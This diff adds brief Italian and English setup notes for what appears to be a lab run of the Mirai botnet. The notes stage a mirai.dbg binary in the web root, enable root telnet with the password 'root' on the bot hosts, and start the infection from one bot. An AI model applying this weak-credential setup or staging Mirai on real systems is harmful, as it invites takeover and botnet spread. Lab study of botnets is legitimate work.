@@ -1,0 +1,27 @@
+cnc:
+-mv debug/mirai.dbg /var/www/html/bins/
+
+bot1,bot2,bot3:
+-cd /etc/xinetd.d
+-nano telnet:
+service telnet
+{
+flags = REUSE
+socket_type = stream
+wait = no
+user = root
+server = /usr/sbin/in.telnetd
+log_on_failure += USERID
+disable = yes
+}
+
+-sudo passwd root:
+
+password: root
+insert again password: root
+
+-service xinetd start
+
+Avvio infezione:
+-prindere un bot a caso (io preferisco il bot 4 ;) ed eseguire mira.dbg in debug
+
